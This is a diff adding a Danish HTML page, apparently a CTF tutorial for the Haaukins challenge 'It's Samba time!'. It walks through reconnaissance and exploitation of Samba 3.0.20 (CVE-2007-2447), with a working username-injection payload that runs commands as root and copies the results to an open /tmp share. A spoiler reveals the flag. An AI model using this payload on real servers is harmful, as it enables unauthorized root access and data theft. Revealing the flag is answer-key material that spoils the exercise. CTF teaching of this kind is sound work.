@@ -1,0 +1,36 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: It&#x27;s Samba time! — tutorial (CVE-2007-2447)</title>
+<meta name="description" content="Guide til Haaukins It&#x27;s Samba time: udnyt Samba 3.0.20 (CVE-2007-2447 username map script RCE) og exfiltrér via en anonym /tmp-share når shells er blokeret.">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>It&#x27;s Samba time!</h1>
+<p class="subtitle">Samba 3.0.20 RCE (CVE-2007-2447) + exfil via en åben share.</p>
+<div class="badges"><span class="badge cat">Web / Network</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>Trin for trin</h2>
+<pre><code>nmap -sV -p139,445 &lt;ip&gt;        # Samba 3.0.20 = CVE-2007-2447
+smbclient -L //&lt;ip&gt;/ -N --option='client min protocol=NT1'   # shares: tmp (skrivbar)</code></pre>
+             <p>Reverse/bind-shells er netværksblokeret. Kør kommandoen via injektionen (impacket, ondsindet brugernavn)
+             og exfiltrér via den anonyme <code>/tmp</code>-share:</p>
+             <pre><code>c.login("/=`nohup grep -rIoh -e 'HKN{[^}]*}' / 2>/dev/null|sort -u>/tmp/FLAGS;chmod 777 /tmp/FLAGS`","")
+# login kaster LOGON_FAILURE, men map-scriptet kører cmd som root FØR auth fejler</code></pre>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flag: <span class="flag">HKN{h13-EW-XICln}</span></p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li><code>nmap -sV</code> → version → slå CVE op (Samba 3.0.20 = CVE-2007-2447).</li><li>Når shells blokeres: eksekvér via injektionen, exfiltrér via en åben kanal (SMB-share).</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
